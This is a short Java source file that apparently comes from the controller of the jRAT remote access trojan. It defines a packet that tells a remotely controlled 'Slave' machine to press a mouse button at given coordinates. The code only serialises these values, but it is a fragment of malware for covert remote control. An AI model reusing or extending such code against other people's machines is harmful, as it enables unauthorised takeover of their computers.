package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet92MousePress implements OutgoingPacket {

	private int x;
	private int y;
	private int button;
	private int monitor;

	public Packet92MousePress(int x, int y, int button, int monitor) {
		this.x = x;
		this.y = y;
		this.button = button;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(x);
		slave.writeInt(y);
		slave.writeInt(button);
		slave.writeInt(monitor);
	}

	@Override
	public short getPacketId() {
		return 92;
	}

}
